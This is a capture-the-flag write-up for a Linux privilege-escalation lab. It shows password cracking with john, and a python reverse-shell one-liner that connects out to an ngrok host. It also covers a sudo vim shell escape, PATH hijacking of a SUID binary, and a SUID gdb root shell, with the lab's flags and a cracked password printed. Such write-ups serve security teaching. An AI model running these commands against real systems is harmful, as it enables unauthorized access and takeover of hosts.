# escalation

## Description

Can you climb to the top?

Flag format: CTF{sha256}

## Solution

### Flag 1

Let's check the `note.txt` file first.

```text
T3jv1l@bit-sentinel:…/www/html# cat note.txt
I got unauthorized access to some hashes but my PC is too low-end to crack them. I hid them safely in the server, but I'm sure you can find them.


What are you waiting now? Crack away!

Oh, and if this helps, user2 can't shut up about cherries... I don't know what's gotten into him but he started to become annoying as hell. Please start with him!

And when you crack him down, don't forget to upgrade your shell!
```

Navigating to `/opt/.../` we can see a `shadow.bak` file containing the hashes. We will use this and the `/etc/passwd` file to crack the passwords. Just use the `rockyou.txt` wordlist and extract everything you find about cherries.

```zsh
┌──(matteoverz㉿DESKTOP-2JF4J6C)-[~/CTF/Unbreakable/Misc/escalation]
├─$ unshadow etcpasswd shadow > crackme
├─$ cat /usr/share/wordlist/rockyou.txt | grep cherry > passwords
└─$ john --wordlist=passwords crackme

Using default input encoding: UTF-8
Loaded 4 password hashes with 4 different salts (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
!!cherry!!       (user2)     
1g 0:00:00:02 DONE (2023-08-27 22:21) 0.3773g/s 1069p/s 4277c/s 4277C/s bumcherry1..!!cherry!!
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

Since we cannot use an interactive shell on the website provided, we need to spawn a reverse shell. I have used `ngrok` to expose public ip and the following payload:

```zsh
T3jv1l@bit-sentinel:…/www/html# export RHOST="5.tcp.eu.ngrok.io";export RPORT=18105;python3 -c 'import socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
```

This gave me a reverse shell on my terminal and now could authenticate to `user2` with the password `!!cherry!!`.

The first flag is situated in `~/flag1.txt`:

```zsh
user2@t-d2-c12840u-l945-escalation-7cfbcf5b5-2csxm:~$ cat flag1.txt
Here's your first flag: ctf{d6285bf0fef00f1b70cb52bdf168d2b6463d53b484bd6da7e098b3d5617bddaa}

Good luck escalating!
```

### Flag 2

Running `sudo -l` on `user2`, we find out we can run `/usr/bin/vim` as `user3`. So we will just do that and then spawn a bash shell inside vim using `:!/bin/bash`.

Now we are authenticated using user3. The next flag is in `~/flag2.txt`

```zsh
user3@t-d2-c12840u-l945-escalation-7cfbcf5b5-2csxm:~$ cat flag2.txt
Here's your second flag: ctf{8c4384c8f1b5ae73359592cd5d34b4eeacea1c757989dacce29d637d2f4b25f1}

One more and you are on the top of the mountain!
```

### Flag 3

We will use SUID priviledge escalation

```zsh
user3@t-d2-c12840u-l945-escalation-7cfbcf5b5-2csxm:~$ find / -perm -u=s -type f 2>/dev/null
/usr/bin/chfn
/usr/bin/passwd
/usr/bin/chsh
/usr/bin/gpasswd
/usr/bin/newgrp
/usr/bin/gdb
/usr/bin/fixpermissions
/usr/bin/sudo
/bin/umount
/bin/su
/bin/mount
```

`/usr/bin/fixpermissions` sounds interesting. Running `strings` on this binary, gives us an interesting command:

```bash
user3@t-d2-c12840u-l945-escalation-7cfbcf5b5-2csxm:~$ strings /usr/bin/fixpermissions | grep flag
chmod 600 /tmp/flag
```

Since this is not running `/bin/chmod`, but `chmod`, we can create our own `chmod` and set it to spawn a shell.

```zsh
user3@t-d2-c12840u-l945-escalation-7cfbcf5b5-2csxm:~$ cd /tmp
user3@t-d2-c12840u-l945-escalation-7cfbcf5b5-2csxm:/tmp$ mkdir .dummy
user3@t-d2-c12840u-l945-escalation-7cfbcf5b5-2csxm:/tmp$ cd .dummy
user3@t-d2-c12840u-l945-escalation-7cfbcf5b5-2csxm:/tmp/.dummy$ echo /bin/bash > chmod
user3@t-d2-c12840u-l945-escalation-7cfbcf5b5-2csxm:/tmp/.dummy$ chmod +x chmod
user3@t-d2-c12840u-l945-escalation-7cfbcf5b5-2csxm:/tmp/.dummy$ export PATH=/tmp/.dummy:$PATH
user3@t-d2-c12840u-l945-escalation-7cfbcf5b5-2csxm:/tmp/.dummy$ /usr/bin/fixpermissions
user4@t-d2-c12840u-l945-escalation-7cfbcf5b5-2csxm:~$ cd /home/user4
user4@t-d2-c12840u-l945-escalation-7cfbcf5b5-2csxm:/home/user4$ ls
flag3.txt
user4@t-d2-c12840u-l945-escalation-7cfbcf5b5-2csxm:/home/user4$ cat flag3.txt
All hail the privilege escalation master!

Here's the last flag: ctf{8d9f87dc5144aa305af81f2106eb723480bfc1a5f5ca34ef4374de2641814727}

Do you think this is enough?
```

### Flag 4

Coming back to the SUID's, we can also use `gdb`, which will help us with priviledge escalation. (<https://github.com/gurkylee/Linux-Privilege-Escalation-Basics>)

```zsh
$ gdb -nx -ex 'python import os; os.execl("/bin/sh", "sh", "-p")' -ex quit
GNU gdb (Debian 8.2.1-2+b3) 8.2.1
Copyright (C) 2018 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
Type "show copying" and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
    <http://www.gnu.org/software/gdb/documentation/>.

For help, type "help".
Type "apropos word" to search for commands related to "word".
$ whoami
user5
```

Success! We are now logged in as `user5`.

```zsh
$ cd /home/user5
$ cat flag4.txt
Do you think is nothing to do? What about another flag little shrimp.

Flag: ctf{fca862cbd46080db28cbe3c541a0de84db1bb53baf1242d5532c6338e5634a4b}

           \.   \.      __,-"-.__      ./   ./
       \.   \`.  \`.-'"" _,="=._ ""`-.'/  .'/   ./
        \`.  \_`-''      _,="=._      ``-'_/  .'/
         \ `-',-._   _.  _,="=._  ,_   _.-,`-' /
      \. /`,-',-._"""  \ _,="=._ /  """_.-,`-,'\ ./
       \`-'  /    `-._  "       "  _.-'    \  `-'/
       /)   (         \    ,-.    /         )   (\
    ,-'"     `-.       \  /   \  /       .-'     "`-,
  ,'_._         `-.____/ /  _  \ \____.-'         _._`,
 /,'   `.                \_/ \_/                .'   `,\
/'       )                  _                  (       `\
        /   _,-'"`-.  ,++|T|||T|++.  .-'"`-,_   \
       / ,-'        \/|`|`|`|'|'|'|\/        `-, \
      /,'             | | | | | | |             `,\
     /'               ` | | | | | '               `\
                        ` | | | '
                          ` | '
```
